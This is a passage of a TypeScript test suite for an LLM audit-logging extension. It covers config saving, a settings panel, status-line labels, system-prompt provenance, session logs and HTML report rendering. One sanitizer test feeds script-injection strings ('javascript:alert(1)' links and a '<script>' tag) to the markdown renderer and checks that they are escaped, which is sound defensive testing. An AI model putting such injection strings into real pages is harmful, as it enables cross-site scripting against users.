    assert.equal(merged.showStatus, false);
    assert.equal(merged.mode, "metrics", "untouched settings keep their value");

    await saveConfig({ retentionDays: 99_999 }, path);
    assert.equal(
      (JSON.parse(await readFile(path, "utf8")) as Record<string, unknown>)
        .retentionDays,
      30,
      "out-of-range values are validated, not written raw",
    );
  } finally {
    await rm(directory, { recursive: true, force: true });
  }
});
test("config panel edits the session and saves only when asked", async () => {
  const directory = await mkdtemp(join(tmpdir(), "llm-audit-panel-"));
  const notifications: string[] = [];
  let saves = 0;
  const controller = fakeController(directory, {
    saveConfig: async () => {
      saves++;
      return { path: join(directory, "llm-audit.json") };
    },
  });
  try {
    const items = configItems(controller.getConfig());
    // Scripted dialog answers: switch content mode to full (confirm yes), toggle
    // the status line off (confirm yes), save, then close.
    const selections: (string | undefined)[] = [
      items[1]!,
      "full — stores payload content (secrets still redacted)",
      items[2]!,
      "Save to config file",
      "Close (keep session changes)",
    ];
    const ctx = {
      hasUI: true,
      ui: {
        notify: (message: string) => notifications.push(message),
        select: async () => selections.shift(),
        confirm: async () => true,
        input: async () => undefined,
      },
    } as unknown as ExtensionCommandContext;
    await runConfigPanel(controller, ctx);
    const config = controller.getConfig();
    assert.equal(config.mode, "full", "mode change applied to the session");
    assert.equal(config.capturePayload, true, "full mode turns capture on");
    assert.equal(
      config.showStatus,
      false,
      "a confirmed \"turn this off\" answer actually turns it off",
    );
    assert.equal(saves, 1, "exactly one save, only when Save was chosen");
    assert.ok(
      notifications.some((message) => message.includes("Config saved")),
      "save is reported",
    );
    // cancelling the panel never writes
    const before = saves;
    const cancelCtx = {
      hasUI: true,
      ui: {
        notify: () => undefined,
        select: async () => undefined,
        confirm: async () => true,
        input: async () => undefined,
      },
    } as unknown as ExtensionCommandContext;
    await runConfigPanel(controller, cancelCtx);
    assert.equal(saves, before, "escape does not save");
  } finally {
    await rm(directory, { recursive: true, force: true });
  }
});
test("status line reports the audit mode, not just the last request", () => {
  const metrics = baseMetrics();
  const config = { ...DEFAULT_CONFIG };
  // state is visible before any request completes
  assert.equal(statusLineLabel(config, metrics), "llm-audit metrics");
  assert.equal(
    statusLineLabel({ ...config, enabled: false }, metrics),
    "llm-audit off",
  );
  assert.equal(
    statusLineLabel({ ...config, mode: "full", capturePayload: true }, metrics),
    "llm-audit full",
  );
  // the state most worth flagging: a content mode that is not storing content
  assert.equal(
    statusLineLabel({ ...config, mode: "full", capturePayload: false }, metrics),
    "llm-audit full (capture off)",
  );
  assert.equal(
    statusLineLabel({ ...config, mode: "redacted", capturePayload: true }, metrics),
    "llm-audit redacted",
  );
  // a completed request appends a short summary that has to survive one line
  const request = auditRequest(analyzePayload({ system: "s".repeat(500) }, config));
  metrics.requests.push(request);
  metrics.requestCount = 1;
  metrics.payloadBytes = request.analysis.payloadBytes;
  const label = statusLineLabel(config, metrics);
  assert.match(label, /^llm-audit metrics \| 1 req \u00b7 /);
  assert.ok(
    label.length <= 64,
    `the status line stays short enough for a single-line bar (${label.length} chars: ${label})`,
  );
  // the long-form breakdown still exists, it just is not the status line
  assert.match(lastRequestSummary(request, metrics), /^LLM #1 /);
  // ...unless the turn summary is turned off
  assert.equal(
    statusLineLabel({ ...config, showTurnSummary: false }, metrics),
    "llm-audit metrics",
  );
});
test("every command refreshes the status line", async () => {
  const directory = await mkdtemp(join(tmpdir(), "llm-audit-statusline-"));
  let refreshes = 0;
  try {
    const host = fakeHost(
      directory,
      fakeController(directory, {
        refreshStatus: () => {
          refreshes++;
        },
      }),
    );
    await host.run("status");
    assert.equal(refreshes, 1, "read-only commands refresh too");
    await host.run("capture full");
    assert.equal(refreshes, 2, "a mode change refreshes immediately");
  } finally {
    await rm(directory, { recursive: true, force: true });
  }
});
test("segments a system prompt and maps its blocks to origins", () => {
  const system = [
    "You are an expert coding assistant operating inside pi, a coding agent harness.",
    "<project_context>",
    "# MyProject",
    "A project line that is comfortably long enough for matching purposes.",
    "<available_skills>",
    "<skill><name>alpha</name><description>Does alpha things</description><location>/tmp/alpha/SKILL.md</location></skill>",
    "</available_skills>",
    "## MEMORY.md (long-term)",
    "A memory line that is comfortably long enough to be matched as well.",
  ].join("\n");
  const report = analyzeProvenance({ systemText: system, memoryDir: "/tmp/mem" });
  const kinds = new Set(report.blocks.map((block) => block.kind));
  assert.ok(kinds.has("harness"), "leading text is harness boilerplate");
  assert.ok(kinds.has("project"), "project context wrapper is recognised");
  assert.ok(kinds.has("memory"), "memory header is recognised");
  // the skills block is emitted per skill, and not again by the marker pass
  const skillBlocks = report.blocks.filter((block) => block.kind === "skill" && block.label.startsWith("skill: "));
  assert.equal(skillBlocks.length, 1);
  assert.equal(skillBlocks[0]?.skillName, "alpha");
  assert.equal(skillBlocks[0]?.source, "/tmp/alpha/SKILL.md", "declared location is kept");
  assert.equal(skillBlocks[0]?.used, false, "nothing loaded it in this session");
  assert.ok(report.groups.every((group) => group.share <= 1 && group.share >= 0));
  assert.ok(report.attributedBytes <= report.totalBytes);
  assert.match(formatProvenance(report), /system prompt .* B \| attributed/);
});
test("keeps only the provenance it can substantiate", async () => {
  const directory = await mkdtemp(join(tmpdir(), "llm-audit-prov-"));
  const agentsPath = join(directory, "AGENTS.md");
  const memoryDir = join(directory, "memory");
  await mkdir(memoryDir, { recursive: true });
  const agentsLine = "Always run the smallest relevant check before declaring work done.";
  const memoryLine = "The package author is Abi Anbiya and never invented from a handle.";
  await writeFile(agentsPath, `# Project rules\n${agentsLine}\nSecond rule line long enough to count as a real match.\n`);
  await writeFile(join(memoryDir, "MEMORY.md"), `# Memory\n${memoryLine}\n`);
  try {
    const system = [
      "Harness base prompt text that is long enough to look like content.",
      "# Project rules",
      agentsLine,
      "Second rule line long enough to count as a real match.",
      "## MEMORY.md (long-term)",
      memoryLine,
    ].join("\n");
    const report = analyzeProvenance({
      systemText: system,
      candidates: [agentsPath],
      memoryDir,
    });
    const agents = report.blocks.find((block) => block.source === agentsPath);
    assert.ok(agents, "AGENTS.md content is attributed to the file");
    assert.ok((agents?.matchedLines ?? 0) > 0, "confidence is reported");
    const memory = report.blocks.find((block) => block.kind === "memory");
    assert.equal(memory?.source, join(memoryDir, "MEMORY.md"));
    assert.ok(report.attributedBytes > 0);
    // A memory header whose file does not match is reported without a source
    // rather than attributed on faith.
    const wrong = analyzeProvenance({
      systemText: "## MEMORY.md (long-term)\nText that is not in any memory file at all, quite long.",
      memoryDir: directory,
    });
    const unverified = wrong.blocks.find((block) => block.kind === "memory");
    assert.equal(unverified?.source, undefined);
  } finally {
    await rm(directory, { recursive: true, force: true });
  }
});
test("lists session logs with their request and payload counts", async () => {
  const directory = await mkdtemp(join(tmpdir(), "llm-audit-sessions-"));
  try {
    const withPayload = [
      record({ recordType: "session_start", timestamp: "2026-01-01T00:00:00.000Z", cwd: "/tmp/proj", mode: "full" }),
      requestRecord(1, [{ role: "user", content: "hi" }], true),
      requestRecord(2, [{ role: "user", content: "again" }], true),
    ].join("\n");
    const metricsOnly = [
      record({ recordType: "session_start", timestamp: "2026-01-02T00:00:00.000Z", cwd: "/tmp/other", mode: "metrics" }),
      requestRecord(1, undefined, false, { system: "s" }),
    ].join("\n");
    await writeFile(join(directory, "aaaaaaaa-old.jsonl"), withPayload);
    await writeFile(join(directory, "bbbbbbbb-new.jsonl"), metricsOnly);
    const sessions = await listSessions(directory);
    assert.equal(sessions.length, 2);
    const full = sessions.find((session) => session.id === "aaaaaaaa-old");
    assert.equal(full?.requests, 2);
    assert.equal(full?.payloads, 2);
    assert.equal(full?.cwd, "/tmp/proj");
    assert.equal(full?.mode, "full");
    assert.equal(full?.complete, true);
    const metrics = sessions.find((session) => session.id === "bbbbbbbb-new");
    assert.equal(metrics?.payloads, 0);
    assert.equal(metrics?.mode, "metrics");
    // a scan budget must be reported, never silently truncate the counts
    const bounded = await listSessions(directory, { scanBytes: 1, limit: 1 });
    assert.equal(bounded.length, 1);
    assert.equal(bounded[0]?.complete, false);
  } finally {
    await rm(directory, { recursive: true, force: true });
  }
});
test("refuses to guess which session to report", async () => {
  const directory = await mkdtemp(join(tmpdir(), "llm-audit-target-"));
  try {
    // A log exists in the directory, but not for the current session: reporting
    // it silently would be reporting the wrong session.
    await writeFile(
      join(directory, "someone-else.jsonl"),
      record({ recordType: "session_start", cwd: "/tmp/elsewhere" }),
    );
    const host = fakeHost(directory);
    const html = await host.run("html --no-open");
    assert.match(html[0] ?? "", /No audit log for this session/);
    assert.match(html[0] ?? "", /llm-audit sessions/);
    assert.ok(!existsSync(join(directory, "someone-else.report.html")), "nothing was reported");
    const sources = await host.run("sources");
    assert.match(sources[0] ?? "", /No audit log/);
  } finally {
    await rm(directory, { recursive: true, force: true });
  }
});
test("report shows expandable source blocks, tokens, and a capped message list", async () => {
  const directory = await mkdtemp(join(tmpdir(), "llm-audit-blocks-"));
  const path = join(directory, "session.jsonl");
  const system = {
    role: "system",
    content:
      "Harness base instruction that is comfortably long enough to look real.\n" +
      "# Rules\n" +
      "Always run the smallest relevant check before declaring a task done.\n",
  };
  const messages: unknown[] = [system];
  for (let index = 0; index < 12; index++)
    messages.push({
      role: "user",
      content: `message ${index} ${"x".repeat(120 + index * 60)}`,
    });
  await writeFile(path, `${requestRecord(1, messages, true)}\n`);
  try {
    const model = buildReportModel(
      await readAuditLog(path, { embedBodies: true }),
      { embedBodies: true },
    );
    const html = renderHtml(model);
    assert.ok(model.provenance, "a captured system message yields provenance");
    assert.ok(
      model.provenance!.blocks.some((block) => (block.text?.length ?? 0) > 0),
      "provenance blocks carry their own text",
    );
    assert.ok(html.includes("show block"), "blocks are expandable in the report");
    assert.ok(html.includes("~Tokens"), "token columns are rendered");
    assert.ok(
      !html.includes("<h2>Findings</h2>"),
      "the findings section was removed",
    );
    assert.equal(
      (html.match(/class="row" id="m-/g) ?? []).length,
      10,
      "the 10 largest messages, each an expandable anchored card",
    );
    assert.match(html, /Showing the 10 largest/);
    assert.match(html, /re-sent in \d+ request/);
  } finally {
    await rm(directory, { recursive: true, force: true });
  }
});
test("renders markdown without letting captured content become markup", () => {
  const html = renderMarkdown(
    [
      "# Title",
      "",
      "- first",
      "- second",
      "",
      "> quoted line",
      "",
      "[bad](javascript:alert(1)) and [good](https://pi.dev)",
      "",
      "```js",
      "const x = 1 < 2 && 3 > 2;",
      "```",
      "",
      "plain <script>alert(1)</script> text",
    ].join("\n"),
  );
  assert.ok(!/<script/i.test(html), "no script tag can come out of content");
  assert.ok(html.includes("&lt;script&gt;"), "markup is escaped and still visible");
  assert.ok(!/href="javascript:/i.test(html), "javascript: URLs never become links");
  assert.ok(
    html.includes("javascript:alert(1)"),
    "a refused link stays visible as inert text rather than disappearing",
  );
  assert.ok(html.includes('href="https://pi.dev"'), "http links render");
  assert.ok(html.includes('rel="noreferrer noopener"'), "links are marked safe");
  assert.ok(html.includes("1 &lt; 2 &amp;&amp; 3 &gt; 2"), "code fences escape their content");
  assert.ok(html.includes("<ul>") && html.includes("<blockquote>"), "lists and quotes render");
  assert.ok(/<h2 class="md">Title<\/h2>/.test(html), "headings are demoted below the report's own");
});
test("lays out a treemap that fills the canvas exactly", () => {
  const items = [
    { label: "system", bytes: 5_000, group: "system" },
    { label: "tool: read", bytes: 3_000, group: "tools" },
    { label: "history", bytes: 2_000, group: "history" },
  ];
  const layout = layoutTreemap(items, 800, 400);
  assert.equal(layout.tiles.length, 3);
  const area = layout.tiles.reduce(
    (sum, tile) => sum + tile.width * tile.height,
    0,
  );
  assert.ok(Math.abs(area - 800 * 400) < 1, `tiles cover the canvas (${area})`);
  for (const tile of layout.tiles) {
    assert.ok(tile.x >= 0 && tile.y >= 0, "inside the canvas");
    assert.ok(tile.x + tile.width <= 800.001, "no horizontal overflow");
    assert.ok(tile.y + tile.height <= 400.001, "no vertical overflow");
  }
  const svg = renderTreemapSvg(items, { width: 800, height: 400 });
  assert.ok(svg.includes("<svg") && svg.includes('role="img"'));
  assert.ok(!/<script/i.test(svg), "the chart is static SVG");
  assert.ok(svg.includes("<title>"), "every tile keeps a tooltip");
  // phantom contributors must not create invisible tiles
  assert.equal(
    layoutTreemap([...items, { label: "empty", bytes: 0, group: "other" }], 800, 400)
      .tiles.length,
    3,
  );
  assert.equal(renderTreemapSvg([{ label: "x", bytes: 0, group: "other" }]), "");
});
test("a tilde in PI_CODING_AGENT_DIR never sends the config somewhere else", async () => {
  const previous = process.env.PI_CODING_AGENT_DIR;
  try {
    process.env.PI_CODING_AGENT_DIR = "~/.pi/profiles/tilde-probe";
    const expanded = join(homedir(), ".pi/profiles/tilde-probe/llm-audit.json");
    assert.equal(
      configPathForSave(),
      expanded,
      "a tilde env var is expanded rather than resolved against the cwd",
    );
    assert.ok(
      !configPathForSave().includes(`${sep}~${sep}`),
      "no literal ~ directory is ever written into the extension's install path",
    );
    // The spelling of the env var must not change which file is used.
    process.env.PI_CODING_AGENT_DIR = join(homedir(), ".pi/profiles/tilde-probe");
    assert.equal(configPathForSave(), expanded, "expanded and plain spellings agree");
  } finally {
    if (previous === undefined) delete process.env.PI_CODING_AGENT_DIR;
    else process.env.PI_CODING_AGENT_DIR = previous;
  }
});
test("the file that is saved is the file that is loaded again", async () => {
  const directory = await mkdtemp(join(tmpdir(), "llm-audit-roundtrip-"));
  const previous = process.env.PI_CODING_AGENT_DIR;
  try {
    process.env.PI_CODING_AGENT_DIR = directory;
    assert.equal(
      configPathForSave(),
      join(directory, "llm-audit.json"),
      "a save lands in the active profile",
    );
    await saveConfig({ mode: "full", capturePayload: true });
    // A fresh process: the loader now has to find what the save wrote.
    const reloaded = loadConfig();
    assert.equal(reloaded.config.mode, "full", "mode survives a reload");
    assert.equal(reloaded.config.capturePayload, true, "capture survives a reload");
    assert.equal(
      defaultConfigPath(),
      configPathForSave(),
      "after the first save the read path and the write path are the same file",
    );
  } finally {
    if (previous === undefined) delete process.env.PI_CODING_AGENT_DIR;
    else process.env.PI_CODING_AGENT_DIR = previous;
    await rm(directory, { recursive: true, force: true });
  }
});
test("closing the panel with unsaved changes asks before dropping them", async () => {
  const directory = await mkdtemp(join(tmpdir(), "llm-audit-close-"));
  try {
    // Declining the save keeps the change session-only and writes nothing.
    {
      const notifications: string[] = [];
      let saves = 0;
      const controller = fakeController(directory, {
        saveConfig: async () => {
          saves++;
          return { path: join(directory, "llm-audit.json") };
        },
      });
      const items = configItems(controller.getConfig());
      const selections: (string | undefined)[] = [
        items[1]!,
        "full — stores payload content (secrets still redacted)",
        "Close (keep session changes)",
      ];
      // First confirm accepts the switch to full; second declines the save.
      const confirmAnswers = [true, false];
      const ctx = {
        hasUI: true,
        ui: {
          notify: (message: string) => notifications.push(message),
          select: async () => selections.shift(),
          confirm: async () => confirmAnswers.shift() ?? false,
          input: async () => undefined,
        },
      } as unknown as ExtensionCommandContext;
      await runConfigPanel(controller, ctx);
      assert.deepEqual(confirmAnswers, [], "the panel asked whether to save");
      assert.equal(saves, 0, "declining writes nothing");
      assert.equal(controller.getConfig().mode, "full", "the session keeps the change");
      assert.ok(
        notifications.some((message) => message.includes("nothing written to disk")),
        "declining says so instead of dropping the edit silently",
      );
    }
    // Accepting it saves from the close prompt, without a separate Save row.
    {
      const notifications: string[] = [];
      let saves = 0;
      const controller = fakeController(directory, {
        saveConfig: async () => {
          saves++;
          return { path: join(directory, "llm-audit.json") };
        },
      });
      const items = configItems(controller.getConfig());
      const selections: (string | undefined)[] = [
        items[1]!,
        "full — stores payload content (secrets still redacted)",
        "Close (keep session changes)",
      ];
      const confirmBodies: string[] = [];
      const ctx = {
        hasUI: true,
        ui: {
          notify: (message: string) => notifications.push(message),
          select: async () => selections.shift(),
          confirm: async (_title: string, body: string) => {
            confirmBodies.push(body);
            return true;
          },
          input: async () => undefined,
        },
      } as unknown as ExtensionCommandContext;
      await runConfigPanel(controller, ctx);
      assert.equal(saves, 1, "accepting the close prompt saves");
      assert.ok(
        confirmBodies.some((body) => body.includes("store payload content")),
        "the close prompt still warns before persisting content capture",
      );
      assert.ok(
        notifications.some((message) => message.includes("Config saved")),
        "saving is reported",
      );
    }
    // Closing an untouched panel never asks and never saves.
    {
      let saves = 0;
      let confirms = 0;
      const controller = fakeController(directory, {
        saveConfig: async () => {
          saves++;
          return { path: join(directory, "llm-audit.json") };
        },
      });
      const selections: (string | undefined)[] = ["Close (keep session changes)"];
      const ctx = {
        hasUI: true,
        ui: {
          notify: () => {},
          select: async () => selections.shift(),
          confirm: async () => {
            confirms++;
            return true;
          },
          input: async () => undefined,
        },
      } as unknown as ExtensionCommandContext;
      await runConfigPanel(controller, ctx);
      assert.equal(confirms, 0, "nothing changed, so nothing is asked");
      assert.equal(saves, 0, "and nothing is written");
    }
  } finally {
    await rm(directory, { recursive: true, force: true });
  }
});

let failed = 0;
for (const [name, run] of tests) {
  try {
    await run();
    console.log(`ok - ${name}`);
  } catch (error) {
    failed++;
    console.error(`not ok - ${name}\n`, error);
  }
}
if (failed) process.exitCode = 1;
